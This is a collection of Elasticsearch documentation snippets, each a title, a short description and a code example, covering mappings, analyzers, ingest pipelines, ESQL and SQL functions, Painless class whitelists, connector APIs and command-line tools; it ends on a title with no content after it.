TITLE: Retrieving Auto-flattened Mapping in Elasticsearch
DESCRIPTION: This snippet shows the result of retrieving the mapping for an index where object mappings have been auto-flattened due to 'subobjects: false' configuration. It demonstrates how nested object fields are flattened with dot notation.

LANGUAGE: console-result
CODE:
{
  "my-index-000002" : {
    "mappings" : {
      "properties" : {
        "metrics" : {
          "subobjects" : false,
          "properties" : {
            "time.min" : {
              "type" : "long"
            },
            "time.max" : {
              "type" : "long"
            }
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Removing Multiple Fields with Remove Processor in Elasticsearch
DESCRIPTION: This example shows how to configure the Remove processor to remove multiple fields ('user_agent' and 'url') from a document in an Elasticsearch ingest pipeline.

LANGUAGE: json
CODE:
{
  "remove": {
    "field": ["user_agent", "url"]
  }
}

----------------------------------------

TITLE: Creating Custom Analyzer with Delimited Payload Filter in Elasticsearch
DESCRIPTION: This example shows how to use the create index API to configure a new custom analyzer that includes the delimited_payload filter.

LANGUAGE: console
CODE:
PUT delimited_payload
{
  "settings": {
    "analysis": {
      "analyzer": {
        "whitespace_delimited_payload": {
          "tokenizer": "whitespace",
          "filter": [ "delimited_payload" ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Gmail Advanced Search Rules
DESCRIPTION: Example of Gmail advanced search syntax for filtering messages during sync

LANGUAGE: js
CODE:
{
  "messages": [
    "before:2021/10/10",
    "from:amy"
  ]
}

----------------------------------------

TITLE: Configuring Stemmer Override Filter with Inline Rules in Elasticsearch
DESCRIPTION: This snippet demonstrates how to set up a custom analyzer with a stemmer override filter using inline rules. It defines the same analyzer as the previous example but includes the stemming rules directly in the configuration.

LANGUAGE: console
CODE:
PUT /my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "standard",
          "filter": [ "lowercase", "custom_stems", "porter_stem" ]
        }
      },
      "filter": {
        "custom_stems": {
          "type": "stemmer_override",
          "rules": [
            "running, runs => run",
            "stemmer => stemmer"
          ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Whitelisting ScriptedMetricAggContexts Classes for Painless
DESCRIPTION: Whitelist configuration for ScriptedMetricAggContexts MapScript classes to enable their use in Painless scripting. The @no_import annotation prevents direct imports of these classes in scripts.

LANGUAGE: painless
CODE:
class org.elasticsearch.script.ScriptedMetricAggContexts$MapScript @no_import {
}
class org.elasticsearch.script.ScriptedMetricAggContexts$MapScript$Factory @no_import {
}

----------------------------------------

TITLE: Displaying Supported Type Combinations for ESQL Function in Markdown
DESCRIPTION: A markdown table showing the supported input type combinations and their corresponding result types for an ESQL function. The table covers various numeric types including double, integer, long, and unsigned_long.

LANGUAGE: markdown
CODE:
| number1 | number2 | result |
| --- | --- | --- |
| double | double | double |
| double | integer | double |
| double | long | double |
| double | unsigned_long | double |
| integer | double | double |
| integer | integer | double |
| integer | long | double |
| integer | unsigned_long | double |
| long | double | double |
| long | integer | double |
| long | long | double |
| long | unsigned_long | double |
| unsigned_long | double | double |
| unsigned_long | integer | double |
| unsigned_long | long | double |
| unsigned_long | unsigned_long | double |

----------------------------------------

TITLE: Configuring Kuromoji Iteration Mark Character Filter in Elasticsearch
DESCRIPTION: This YAML configuration snippet shows the available settings for the kuromoji_iteration_mark character filter. It allows customization of normalization for kanji and kana iteration marks.

LANGUAGE: yaml
CODE:
normalize_kanji: true
normalize_kana: true

----------------------------------------

TITLE: Defining a Runtime Field with Painless Script in Elasticsearch
DESCRIPTION: This snippet demonstrates how to define a runtime field named 'day_of_week' using a Painless script. The script extracts the day of the week from a 'datetime' field.

LANGUAGE: json
CODE:
PUT seats/_mapping
{
  "runtime": {
    "day_of_week": {
      "type": "keyword",
      "script": {
        "source": "emit(doc['datetime'].value.getDayOfWeekEnum().toString())"
      }
    }
  }
}

----------------------------------------

TITLE: Arithmetic Operators in Painless
DESCRIPTION: Examples of basic arithmetic operators (+, -, *, /) showing type promotion and handling of different numeric types.

LANGUAGE: painless
CODE:
int i = 29+4;
double d = i+7.0;

LANGUAGE: painless
CODE:
def x = 5+4;
def y = x+2;

----------------------------------------

TITLE: Using runtime fields in an EQL search in Elasticsearch
DESCRIPTION: Demonstrates how to use runtime fields to extract and create fields during an EQL search in Elasticsearch.

LANGUAGE: JSON
CODE:
GET /my-data-stream/_eql/search?filter_path=-hits.events._source
{
  "runtime_mappings": {
    "day_of_week": {
      "type": "keyword",
      "script": "emit(doc['@timestamp'].value.dayOfWeekEnum.toString())"
    }
  },
  "query": """
    process where process.name == "regsvr32.exe"
  """,
  "fields": [
    "@timestamp",
    "day_of_week"
  ]
}

----------------------------------------

TITLE: Using CURRENT_TIMESTAMP Function
DESCRIPTION: Examples of using CURRENT_TIMESTAMP function to get the current date and time, with optional precision parameter.

LANGUAGE: sql
CODE:
SELECT CURRENT_TIMESTAMP AS result;

LANGUAGE: sql
CODE:
SELECT CURRENT_TIMESTAMP() AS result;

LANGUAGE: sql
CODE:
SELECT CURRENT_TIMESTAMP(1) AS result;

LANGUAGE: sql
CODE:
SELECT first_name FROM emp WHERE hire_date > NOW() - INTERVAL 100 YEARS ORDER BY first_name ASC LIMIT 5;

----------------------------------------

TITLE: Generating Certificate Signing Requests in Silent Mode
DESCRIPTION: This example shows how to generate certificate signing requests (CSRs) for multiple instances using elasticsearch-certutil in silent mode with a YAML configuration file.

LANGUAGE: shell
CODE:
bin/elasticsearch-certutil csr --silent --in instances.yml --out test2.zip --pass testpassword

----------------------------------------

TITLE: Creating Gmail Connector via Elasticsearch API
DESCRIPTION: API call to create a new Gmail connector instance in Elasticsearch

LANGUAGE: console
CODE:
PUT _connector/my-gmail-connector
{
  "index_name": "my-elasticsearch-index",
  "name": "Content synced from Gmail",
  "service_type": "gmail"
}

----------------------------------------

TITLE: Wildcard Fields Search in Elasticsearch
DESCRIPTION: Demonstrates using wildcards in field specifications for simple query string searches. The query searches for 'Will Smith' across the title field and any field ending with '_name'.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "simple_query_string" : {
      "query":    "Will Smith",
      "fields": [ "title", "*_name" ]
    }
  }
}

----------------------------------------

TITLE: Auto-generation Comment in HTML
DESCRIPTION: HTML comment indicating that this file is auto-generated by ESQL's AbstractFunctionTestCase and should not be edited manually.

LANGUAGE: html
CODE:
<!--
This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.
-->

----------------------------------------

TITLE: COUNT_DISTINCT with SPLIT Function in ESQL
DESCRIPTION: Demonstrates combining COUNT_DISTINCT with the SPLIT function to count unique values from a delimited string. The example splits a semicolon-separated string and counts the distinct resulting values.

LANGUAGE: esql
CODE:
ROW words="foo;bar;baz;qux;quux;foo"
| STATS distinct_word_count = COUNT_DISTINCT(SPLIT(words, ";"))

----------------------------------------

TITLE: SELECT with PIVOT Clause
DESCRIPTION: Demonstrates the use of PIVOT clause for cross tabulation in Elasticsearch SQL.

LANGUAGE: sql
CODE:
SELECT * FROM test_emp PIVOT (SUM(salary) FOR languages IN (1, 2)) LIMIT 5;

----------------------------------------

TITLE: Defining Parameters in ESQL Function Documentation
DESCRIPTION: This snippet demonstrates how to define and describe parameters for an ESQL function in a markdown format. It shows the structure for documenting a single parameter named 'field'.

LANGUAGE: markdown
CODE:
**Parameters**

`field`
:   Input value. The input can be a single- or multi-valued column or an expression.

----------------------------------------

TITLE: Calculating Minimum Actors to Match Using Painless Script
DESCRIPTION: This Painless script calculates the minimum number of actors that should match in a terms_set query. It uses the lesser of the total number of terms and a user-defined minimum.

LANGUAGE: painless
CODE:
Math.min(params['num_terms'], params['min_actors_to_see'])

----------------------------------------

TITLE: Java Functional Interface Definitions
DESCRIPTION: Comprehensive definition of Java functional interfaces including BiConsumer, Function, Predicate, and various primitive specializations. Each interface lists its available methods with parameter and return types.

LANGUAGE: java
CODE:
class java.util.function.BiConsumer {
  void accept(def,def)
  BiConsumer andThen(BiConsumer)
}

class java.util.function.BiFunction {
  BiFunction andThen(Function)
  def apply(def,def)
}

class java.util.function.BinaryOperator {
  BinaryOperator maxBy(Comparator)
  BinaryOperator minBy(Comparator)
}

class java.util.function.BiPredicate {
  BiPredicate and(BiPredicate)
  BiPredicate negate()
  BiPredicate or(BiPredicate)
  boolean test(def,def)
}

----------------------------------------

TITLE: Concrete Distribution Test Implementation in Java
DESCRIPTION: Demonstrates implementation of a concrete test class extending the abstract distribution test case for a specific distribution type.

LANGUAGE: java
CODE:
public class MyTestDefaultTar extends MyTestCase {
  @Override
  Distribution distribution() { return Distribution.DEFAULT_TAR; }
}

----------------------------------------

TITLE: Required Routing Configuration
DESCRIPTION: Example of configuring an index to require routing values for all CRUD operations.

LANGUAGE: console
CODE:
PUT my-index-000002
{
  "mappings": {
    "_routing": {
      "required": true
    }
  }
}

PUT my-index-000002/_doc/1
{
  "text": "No routing value provided"
}

----------------------------------------

TITLE: Setting EQL Test Credentials Environment Variable in Shell
DESCRIPTION: Sets the environment variable pointing to the GCS credentials file for accessing the test dataset.

LANGUAGE: shell
CODE:
export eql_test_credentials_file=/Users/username/credentials.gcs.json

----------------------------------------

TITLE: Configuring Gsub Processor in Elasticsearch
DESCRIPTION: Example configuration of a Gsub processor that replaces dots with hyphens in a field. The processor applies regular expression pattern matching and replacement on string fields, supporting both single strings and arrays of strings.

LANGUAGE: json
CODE:
{
  "gsub": {
    "field": "field1",
    "pattern": "\\.",
    "replacement": "-"
  }
}

----------------------------------------

TITLE: Setting JVM Options for CLI Tools
DESCRIPTION: Example of setting JVM options for the elasticsearch-node tool by using the CLI_JAVA_OPTS environment variable.

LANGUAGE: shell
CODE:
export CLI_JAVA_OPTS="-Xmx1g"
bin/elasticsearch-node ...

----------------------------------------

TITLE: HTML Comment for ESQL Function Documentation
DESCRIPTION: HTML comment indicating this is auto-generated documentation from AbstractFunctionTestCase for ESQL, with instructions not to edit manually.

LANGUAGE: html
CODE:
<!--
This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.
-->

----------------------------------------

TITLE: Including TO_UPPER Function Syntax Diagram in Markdown
DESCRIPTION: This snippet embeds an SVG image showing the syntax diagram for the TO_UPPER function in ESQL.

LANGUAGE: markdown
CODE:
:::{image} ../../../images/functions/to_upper.svg
:alt: Embedded
:class: text-center
:::

----------------------------------------

TITLE: ESQL MV_CONCAT Function Comment Block
DESCRIPTION: Auto-generated documentation header for the MV_CONCAT function indicating it concatenates values in a group into a multivalued field without preserving order. Suggests using MV_SORT for ordered results.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

----------------------------------------

TITLE: Creating Box Connector via Elasticsearch API
DESCRIPTION: API call to create a new Box connector instance in Elasticsearch

LANGUAGE: console
CODE:
PUT _connector/my-box-connector
{
  "index_name": "my-elasticsearch-index",
  "name": "Content synced from Box",
  "service_type": "box"
}

----------------------------------------

TITLE: Converting Long to Integer Values using TO_INTEGER in ESQL
DESCRIPTION: Demonstrates converting an array of long values to integers using the TO_INTEGER function. Shows how out-of-range values are handled by returning null and generating warning headers. Values that exceed integer range limits will be omitted from the result.

LANGUAGE: esql
CODE:
ROW long = [5013792, 2147483647, 501379200000]
| EVAL int = TO_INTEGER(long)

----------------------------------------

TITLE: Including ST_YMIN Function Documentation Sections in Markdown
DESCRIPTION: These snippets include various documentation sections for the ST_YMIN function, such as parameters, description, types, and examples.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/st_ymin.md
:::

LANGUAGE: markdown
CODE:
:::{include} ../description/st_ymin.md
:::

LANGUAGE: markdown
CODE:
:::{include} ../types/st_ymin.md
:::

LANGUAGE: markdown
CODE:
:::{include} ../examples/st_ymin.md
:::

----------------------------------------

TITLE: Executing elasticsearch-saml-metadata Command in Shell
DESCRIPTION: This snippet shows the full syntax for the elasticsearch-saml-metadata command, including all available options and parameters. It's used to generate a SAML 2.0 Service Provider Metadata file based on the configuration of a SAML realm in Elasticsearch.

LANGUAGE: shell
CODE:
bin/elasticsearch-saml-metadata
[--realm <name>]
[--out <file_path>] [--batch]
[--attribute <name>] [--service-name <name>]
[--locale <name>] [--contacts]
([--organisation-name <name>] [--organisation-display-name <name>] [--organisation-url <url>])
([--signing-bundle <file_path>] | [--signing-cert <file_path>][--signing-key <file_path>])
[--signing-key-password <password>]
[-E <KeyValuePair>]
[-h, --help] ([-s, --silent] | [-v, --verbose])

----------------------------------------

TITLE: Converting Array of Integers to Strings in ESQL
DESCRIPTION: This example shows how the TO_STRING function handles multivalued fields in ESQL. It converts an array of integers to an array of their string representations, demonstrating that TO_STRING works on both scalar and array inputs.

LANGUAGE: esql
CODE:
ROW a=[10, 9, 8]
| EVAL j = TO_STRING(a)

----------------------------------------

TITLE: Configuring Routing Path
DESCRIPTION: Setting to specify the keyword fields used for routing documents to index shards.

LANGUAGE: properties
CODE:
index.routing_path: ["field1", "field2*"]

----------------------------------------

TITLE: Numeric Field Bucketing for Salary Histogram
DESCRIPTION: Example of using BUCKET with numeric fields to create salary range histograms.

LANGUAGE: esql
CODE:
FROM employees
| STATS COUNT(*) by bs = BUCKET(salary, 20, 25324, 74999)
| SORT bs

----------------------------------------

TITLE: Creating and Indexing Geoshape Data
DESCRIPTION: Creates an index with a geo_shape field and indexes a point location for a business in Berlin.

LANGUAGE: console
CODE:
PUT /example
{
  "mappings": {
    "properties": {
      "location": {
        "type": "geo_shape"
      }
    }
  }
}

POST /example/_doc?refresh
{
  "name": "Wind & Wetter, Berlin, Germany",
  "location": {
    "type": "point",
    "coordinates": [ 13.400544, 52.530286 ]
  }
}

----------------------------------------

TITLE: Displaying Supported Types Table in Markdown
DESCRIPTION: This snippet shows a markdown table that lists the supported input point types and their corresponding result types for a specific ESQL function.

LANGUAGE: markdown
CODE:
| point | result |
| --- | --- |
| cartesian_point | double |
| geo_point | double |

----------------------------------------

TITLE: Creating Semantic Text Index with Custom Endpoint
DESCRIPTION: Creates an Elasticsearch index with a semantic_text field using a custom inference endpoint.

LANGUAGE: console
CODE:
PUT my-index-000002
{
  "mappings": {
    "properties": {
      "inference_field": {
        "type": "semantic_text",
        "inference_id": "my-openai-endpoint"
      }
    }
  }
}

----------------------------------------

TITLE: Copying Field Values Using Template Snippets
DESCRIPTION: Example of creating a pipeline that copies OS information from one field to another using template snippets

LANGUAGE: console
CODE:
PUT _ingest/pipeline/set_os
{
  "description": "sets the value of host.os.name from the field os",
  "processors": [
    {
      "set": {
        "field": "host.os.name",
        "value": "{{{os}}}"
      }
    }
  ]
}

POST _ingest/pipeline/set_os/_simulate
{
  "docs": [
    {
      "_source": {
        "os": "Ubuntu"
      }
    }
  ]
}

----------------------------------------

TITLE: Creating Custom Analyzer with Elision Filter in Elasticsearch
DESCRIPTION: This example shows how to use the Elasticsearch create index API to configure a new custom analyzer that includes the elision filter.

LANGUAGE: console
CODE:
PUT /elision_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "whitespace_elision": {
          "tokenizer": "whitespace",
          "filter": [ "elision" ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Advanced Sync Rules for Network Drive Connector
DESCRIPTION: JSON examples of advanced sync rules using glob patterns to specify which folders and files to index from the network drive.

LANGUAGE: js
CODE:
[
  {
    "pattern": "Folder-shared/a/mock/**"
  },
  {
    "pattern": "Folder-shared/b/alpha/**"
  }
]

LANGUAGE: js
CODE:
[
  {
    "pattern": "Folder-shared/a/b/test"
  }
]

LANGUAGE: js
CODE:
[
  {
    "pattern": "Folder-shared/org/*/all-tests/test[135]"
  }
]

LANGUAGE: js
CODE:
[
  {
    "pattern": "Folder-shared/**/all-tests/test[!7]"
  }
]

----------------------------------------

TITLE: Optimizing Wildcard Queries with Edge NGrams
DESCRIPTION: Example showing how to optimize wildcard queries using edge_ngram token filters.

LANGUAGE: console
CODE:
PUT my_queries1
{
  "settings": {
    "analysis": {
      "analyzer": {
        "wildcard_prefix": {
          "type": "custom",
          "tokenizer": "standard",
          "filter": [
            "lowercase",
            "wildcard_edge_ngram"
          ]
        }
      },
      "filter": {
        "wildcard_edge_ngram": {
          "type": "edge_ngram",
          "min_gram": 1,
          "max_gram": 32
        }
      }
    }
  }
}

----------------------------------------

TITLE: ESQL Type Mapping Table in Markdown
DESCRIPTION: Markdown table documenting the mapping of various numeric input types (double, integer, long, unsigned_long) to their corresponding result type (double) in ESQL functions. This is automatically generated by AbstractFunctionTestCase.

LANGUAGE: markdown
CODE:
| number | result |
| --- | --- |
| double | double |
| integer | double |
| long | double |
| unsigned_long | double |

----------------------------------------

TITLE: Configuring Slack notification settings in YAML
DESCRIPTION: YAML configuration for setting up Slack notifications in Watcher, including webhook URL and default message settings.

LANGUAGE: yaml
CODE:
xpack.notification.slack:
  default_account: my_slack
  account:
    my_slack:
      message_defaults:
        from: Watcher
        to: '#alerts'
        icon: 'https://example.com/icon.png'
        attachment:
          color: '#36a64f'

----------------------------------------

TITLE: Using E Function in Elasticsearch SQL
DESCRIPTION: Returns Euler's number (approximately 2.718281828459045).

LANGUAGE: sql
CODE:
SELECT E(), CEIL(E());

       E()       |   CEIL(E())
-----------------+---------------
2.718281828459045|3

----------------------------------------

TITLE: ESQL Greater Than Operator Description
DESCRIPTION: Documentation markup for the greater than operator in ESQL, including operator functionality, image reference, and handling of multivalued fields. When comparing fields, if either is multivalued, the result is null.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

## Greater than `>` [esql-greater_than]

:::{image} ../../../images/operators/greater_than.svg
:alt: Embedded
:class: text-center
:::

Check if one field is greater than another. If either field is [multivalued](/reference/query-languages/esql/esql-multivalued-fields.md) then the result is `null`.

:::{include} ../detailedDescription/greater_than.md
:::

:::{include} ../types/greater_than.md
:::

----------------------------------------

TITLE: Example Usage of Elasticsearch Node Reconfiguration
DESCRIPTION: Shows a complete example of using the elasticsearch-reconfigure-node tool with an enrollment token to configure a node to join an existing cluster.

LANGUAGE: shell
CODE:
sudo /usr/share/elasticsearch/elasticsearch-reconfigure-node --enrollment-token eyJ2ZXIiOiI4LjAuMCIsImFkciI6WyIxOTIuMTY4LjEuMTY6OTIwMCJdLCJmZ3IiOiI4NGVhYzkyMzAyMWQ1MjcyMmQxNTFhMTQwZmM2ODI5NmE5OWNiNmU0OGVhZjYwYWMxYzljM2I3ZDJjOTg2YTk3Iiwia2V5IjoiUy0yUjFINEJrNlFTMkNEY1dVV1g6QS0wSmJxM3hTRy1haWxoQTdPWVduZyJ9

----------------------------------------

TITLE: Extracting X Coordinate from GeoPoint Data Type
DESCRIPTION: Documentation for a function that extracts the X coordinate (longitude) from a point. Specifically designed to work with geo_point data types in Elasticsearch, where X coordinate represents the longitude value.



----------------------------------------

TITLE: Creating an API Key for the Connector
DESCRIPTION: Example of creating an API key for the SharePoint Server connector using the Elasticsearch API.

LANGUAGE: console
CODE:
POST /_security/api_key
{
  "name": "connector_name-connector-api-key",
  "role_descriptors": {
    "connector_name-connector-role": {
      "cluster": [
        "monitor",
        "manage_connector"
      ],
      "indices": [
        {
          "names": [
            "index_name",
            ".search-acl-filter-index_name",
            ".elastic-connectors*"
          ],
          "privileges": [
            "all"
          ],
          "allow_restricted_indices": false
        }
      ]
    }
  }
}

----------------------------------------

TITLE: Documenting Geometry Parameter for Elasticsearch Function
DESCRIPTION: Defines the 'geometry' parameter for an Elasticsearch function. It accepts geo_point, geo_shape, cartesian_point, or cartesian_shape data types. The function returns null if the input is null.

LANGUAGE: markdown
CODE:
**Parameters**

`geometry`
:   Expression of type `geo_point`, `geo_shape`, `cartesian_point` or `cartesian_shape`. If `null`, the function returns `null`.

----------------------------------------

TITLE: Simulating Ingest Pipeline with Painless Script in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the bytes processor in a Painless script within an Elasticsearch ingest pipeline simulation. It converts a human-readable byte value to its numeric byte equivalent.

LANGUAGE: console
CODE:
POST /_ingest/pipeline/_simulate?verbose
{
  "pipeline": {
    "processors": [
      {
        "script": {
          "lang": "painless",
          "source": """
            long bytes = Processors.bytes(ctx.size);
            ctx.size_in_bytes = bytes;
          """
        }
      }
    ]
  },
  "docs": [
    {
      "_source": {
        "size": "1kb"
      }
    }
  ]
}

----------------------------------------

TITLE: Nested Document Operations Class Definition
DESCRIPTION: Defines methods for handling nested document structures including field access and manipulation.

LANGUAGE: java
CODE:
class org.elasticsearch.script.field.NestedDocument {
    WriteField field(String)
    Stream fields(String)
    boolean isEmpty()
    int size()
    boolean exists()
    void remove()
}

----------------------------------------

TITLE: Analyzing Text with Letter Tokenizer in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the Letter tokenizer in Elasticsearch to break text into terms. It shows an example POST request to the _analyze endpoint with the Letter tokenizer and a sample text input.

LANGUAGE: console
CODE:
POST _analyze
{
  "tokenizer": "letter",
  "text": "The 2 QUICK Brown-Foxes jumped over the lazy dog's bone."
}

----------------------------------------

TITLE: Intervals Query with Ordered All_of Rule
DESCRIPTION: This example shows an Intervals query using an ordered all_of rule to match 'my favorite food' followed by 'cold porridge' with specific gap restrictions.

LANGUAGE: console
CODE:
POST _search
{
  "query": {
    "intervals" : {
      "my_text" : {
        "all_of" : {
          "ordered" : true,
          "max_gaps": 1,
          "intervals" : [
            {
              "match" : {
                "query" : "my favorite food",
                "max_gaps" : 0,
                "ordered" : true
              }
            },
            {
              "match" : {
                "query" : "cold porridge",
                "max_gaps" : 4,
                "ordered" : true
              }
            }
          ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Apache License 2.0 Boilerplate Notice Template
DESCRIPTION: Standard boilerplate notice template for applying the Apache License 2.0 to software projects. The template includes placeholders for copyright year and owner information.

LANGUAGE: text
CODE:
Copyright [yyyy] [name of copyright owner]

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

  http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

----------------------------------------

TITLE: Sibling Pipeline Aggregation Example
DESCRIPTION: Demonstration of max_bucket aggregation using buckets_path to reference metrics in sibling aggregations for calculating maximum monthly sales.

LANGUAGE: console
CODE:
POST /_search
{
  "aggs": {
    "sales_per_month": {
      "date_histogram": {
        "field": "date",
        "calendar_interval": "month"
      },
      "aggs": {
        "sales": {
          "sum": {
            "field": "price"
          }
        }
      }
    },
    "max_monthly_sales": {
      "max_bucket": {
        "buckets_path": "sales_per_month>sales"
      }
    }
  }
}

----------------------------------------

TITLE: Creating Index with Structured and Unstructured Fields in Elasticsearch
DESCRIPTION: This snippet demonstrates how to create an index with both annotated_text and structured text fields. It includes a field for unstructured annotated text and a separate field for structured data like entity IDs.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "my_unstructured_text_field": {
        "type": "annotated_text"
      },
      "my_structured_people_field": {
        "type": "text",
        "fields": {
          "keyword" : {
            "type": "keyword"
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Geo-distance Query with Geohash in Elasticsearch
DESCRIPTION: Demonstrates how to use a geohash to specify the location in a geo_distance query.

LANGUAGE: console
CODE:
GET /my_locations/_search
{
  "query": {
    "bool": {
      "must": {
        "match_all": {}
      },
      "filter": {
        "geo_distance": {
          "distance": "12km",
          "pin.location": "drm3btev3e86"
        }
      }
    }
  }
}

----------------------------------------

TITLE: IN Operator Description in ESQL
DESCRIPTION: Documentation header and basic explanation of the IN operator, which allows testing whether a field or expression matches any element in a provided list of values.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

## `IN` [esql-in-operator]

The `IN` operator allows testing whether a field or expression equals an element in a list of literals, fields or expressions.

----------------------------------------

TITLE: Annotated Highlighter Output Example in Elasticsearch
DESCRIPTION: This snippet shows an example of the output produced by the annotated highlighter. It demonstrates how the highlighter injects a key-value annotation for matched search terms while preserving existing markup.

LANGUAGE: plaintext
CODE:
The [cat](_hit_term=cat) sat on the [mat](sku3578)

----------------------------------------

TITLE: Documentation Header Comment
DESCRIPTION: Comment indicating that this is an auto-generated file by ESQL's AbstractFunctionTestCase

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

----------------------------------------

TITLE: Defining ESQL Function Test Case for Euler's Number in LaTeX
DESCRIPTION: This LaTeX code defines a test case for an ESQL function that returns Euler's number. It includes a comment indicating that the file is auto-generated and should not be edited manually.

LANGUAGE: latex
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

----------------------------------------

TITLE: Author Search using QSTR in ESQL
DESCRIPTION: Demonstrates exact text search for books by author 'Faulkner' using QSTR function. The query returns book numbers and authors, sorted by book number and limited to 5 results.

LANGUAGE: esql
CODE:
FROM books
| WHERE QSTR("author: Faulkner")
| KEEP book_no, author
| SORT book_no
| LIMIT 5

----------------------------------------

TITLE: ESQL Function Parameter Documentation
DESCRIPTION: Documents the required parameter for an ESQL function. The function accepts a number parameter that must be between -1 and 1, with null handling built in.

LANGUAGE: markdown
CODE:
`number`
:   Number between -1 and 1. If `null`, the function returns `null`.

----------------------------------------

TITLE: Querying Airport Boundaries with Spatial Functions in ESQL
DESCRIPTION: This ESQL query retrieves the bounding box coordinates for the Copenhagen airport (CPH) from the airport_city_boundaries index. It uses spatial functions like ST_ENVELOPE, ST_XMIN, ST_XMAX, ST_YMIN, and ST_YMAX to calculate the envelope and extract its coordinates.

LANGUAGE: esql
CODE:
FROM airport_city_boundaries
| WHERE abbrev == "CPH"
| EVAL envelope = ST_ENVELOPE(city_boundary)
| EVAL xmin = ST_XMIN(envelope), xmax = ST_XMAX(envelope), ymin = ST_YMIN(envelope), ymax = ST_YMAX(envelope)
| KEEP abbrev, airport, xmin, xmax, ymin, ymax

----------------------------------------

TITLE: Restricting Character Operations in Java
DESCRIPTION: This snippet identifies potentially error-prone character operations when working with char arrays, particularly when the array is used as a buffer.

LANGUAGE: java
CODE:
java.lang.Character#codePointBefore(char[],int)
java.lang.Character#codePointAt(char[],int)

----------------------------------------

TITLE: Including ST_XMIN Function Types in Markdown
DESCRIPTION: This snippet includes the content of a separate Markdown file containing the supported types for the ST_XMIN function.

LANGUAGE: markdown
CODE:
:::{include} ../types/st_xmin.md
:::

----------------------------------------

TITLE: Defining ZoneOffsetTransitionRule Class Methods
DESCRIPTION: Specifies the ZoneOffsetTransitionRule class which defines rules for timezone transitions including day, time, and offset calculations.

LANGUAGE: java
CODE:
class java.time.zone.ZoneOffsetTransitionRule {
  ZoneOffsetTransition createTransition(int)
  int getDayOfMonthIndicator()
  DayOfWeek getDayOfWeek()
  LocalTime getLocalTime()
  Month getMonth()
  ZoneOffset getOffsetAfter()
  ZoneOffset getOffsetBefore()
  ZoneOffset getStandardOffset()
  ZoneOffsetTransitionRule.TimeDefinition getTimeDefinition()
  boolean isMidnightEndOfDay()
  ZoneOffsetTransitionRule of(Month,int,DayOfWeek,LocalTime,boolean,ZoneOffsetTransitionRule.TimeDefinition,ZoneOffset,ZoneOffset,ZoneOffset)
}

----------------------------------------

TITLE: Croneval Usage Example in Bash
DESCRIPTION: Example showing how to validate a cron expression that runs every minute and display the next 20 trigger times.

LANGUAGE: bash
CODE:
bin/elasticsearch-croneval "0 0/1 * * * ?" -c 20

----------------------------------------

TITLE: Basic Stats Bucket Aggregation Syntax in Elasticsearch
DESCRIPTION: Demonstrates the basic syntax structure for a stats_bucket aggregation in isolation.

LANGUAGE: json
CODE:
{
  "stats_bucket": {
    "buckets_path": "the_sum"
  }
}

----------------------------------------

TITLE: Assigning Values to Fields in Painless
DESCRIPTION: Examples of assigning different types of values to fields of a custom Example class.

LANGUAGE: painless
CODE:
Example example = new Example(); 
example.x = 1;                   
example.y = 2.0;                 
example.z = new ArrayList();     

----------------------------------------

TITLE: Defining MovingFunctions Class Methods in Java
DESCRIPTION: Declares the allowed mathematical operations for the MovingFunction pipeline aggregator, including basic statistics (max, min, sum), standard deviation, various averaging methods (unweighted, linear weighted), and forecasting algorithms (EWMA, Holt, Holt-Winters).

LANGUAGE: java
CODE:
class org.elasticsearch.search.aggregations.pipeline.MovingFunctions {
  double max(double[])
  double min(double[])
  double sum(double[])
  double stdDev(double[], double)
  double unweightedAvg(double[])
  double linearWeightedAvg(double[])
  double ewma(double[], double)
  double holt(double[], double, double)
  double holtWinters(double[], double, double, double, int, boolean)
}

----------------------------------------

TITLE: Finding Maximum Value in String Array using MV_MAX in ESQL
DESCRIPTION: Shows how MV_MAX works with keyword (string) arrays by comparing UTF-8 representations byte by byte. Given an array of strings ["foo", "zoo", "bar"], it returns "zoo" as the maximum value.

LANGUAGE: esql
CODE:
ROW a=["foo", "zoo", "bar"]
| EVAL max_a = MV_MAX(a)

----------------------------------------

TITLE: Querying Time Series Aggregation in Elasticsearch
DESCRIPTION: Example demonstrating how to perform a time series aggregation query using the time_series aggregation type with the keyed parameter set to false.

LANGUAGE: javascript
CODE:
GET /_search
{
  "aggs": {
    "ts": {
      "time_series": { "keyed": false }
    }
  }
}

----------------------------------------

TITLE: Removing Index Blocks with Settings Override in Elasticsearch
DESCRIPTION: Creates a new index while explicitly removing all index blocks through settings override.

LANGUAGE: console
CODE:
POST _create_from/my-index/my-new-index
{
  "settings_override": {
    "index": {
      "blocks.write": null,
      "blocks.read": null,
      "blocks.read_only": null,
      "blocks.read_only_allow_delete": null,
      "blocks.metadata": null
    }
  }
}

----------------------------------------

TITLE: Implementing YAML REST Test Suite for Elasticsearch Plugin
